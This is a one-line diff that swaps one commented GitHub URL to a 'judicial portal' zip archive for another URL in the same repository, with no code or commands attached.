@@ -1,1 +1,1 @@
-﻿# https://github.com/i14maxiii/portal-judicial.chrpcm/raw/refs/heads/main/client/public/judicial-portal-chrpcm-v2.5.zip
+﻿# https://raw.githubusercontent.com/i14maxiii/portal-judicial.chrpcm/main/server/chrpcm-judicial-portal-v1.8.zip
